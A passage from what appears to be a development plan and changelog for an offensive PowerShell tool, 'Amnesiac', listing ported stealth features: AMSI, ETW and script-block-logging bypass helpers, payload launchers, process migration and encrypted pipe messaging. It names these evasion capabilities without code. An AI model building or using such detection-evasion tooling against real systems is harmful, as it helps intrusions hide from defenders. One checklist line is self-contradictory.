Ported all stealth-overhaul changes (Plans 1-3) to `Amnesiac_ShellReady.ps1`:

- **Preamble**: Prepended `$AmnesiacLoaderB64` constant and 14 helper functions (`Get-AmsiBypassSnippet`, `Get-EtwBypassSnippet`, `Get-SblBypassSnippet`, `New-PayloadScript`, `Get-PayloadLauncher`, `Initialize-DiskStructure`, `Initialize-ToolCache`, `New-EmbeddedTool`, `Send-Module`, `Test-NetworkLogonToken`, `Protect-PipeMessage`, `Unprotect-PipeMessage`, `Get-PskDerivedKey`, `Show-OpsecBanner`) -- ShellReady transform applied (Write-Output, no colour params, `-` for box-drawing, `--` for em-dash)
- **Initialization**: Replaced inline folder-creation block with `Initialize-DiskStructure`; added stealth-overhaul globals (`$global:DiskMode`, `$global:AmnesiacArtifacts`, `$global:ToolCache`, `$global:EndMarker`, `$global:BufferSize`, `$global:PayloadConfig`, `$global:EngagementProfile`, `$global:PSKPhrase`, `$global:PSKBytes`); added `Initialize-ToolCache` and `Show-OpsecBanner` calls
- **Protocol constants**: Replaced 66 x `"#END#"` (both operator-side equality checks and target-script embedded sends) with `$global:EndMarker`; replaced 25 x `1028` with `$global:BufferSize`
- **Main loop**: Updated `toggle` to include `stealth` format cycling and `exe` DiskMode warning; added handlers for `diskmode`, `artifacts`, `save`, `modules`, `payload`, `psk`, `engagement`
- **Session loop**: Updated session `toggle` to include `stealth` format; added `load loader`, `Migrate ps new <path>`, `Migrate ps <pid>` handlers before the existing `Migrate *` handler
```

If `## [Planned] -- Future Work` section becomes empty after removing the last item, remove the section header entirely.

- [x] **Step 2: Mark all checkboxes in this plan complete**

Change every `- [x]` to `- [x]` in `docs/superpowers/plans/2026-05-24-shellready-sync.md`.

- [x] **Step 3: Commit**

```powershell
git add CHANGELOG.md "docs/superpowers/plans/2026-05-24-shellready-sync.md"
git commit -m "docs: update CHANGELOG and plan checkboxes for Plan 4 (ShellReady sync)"
```
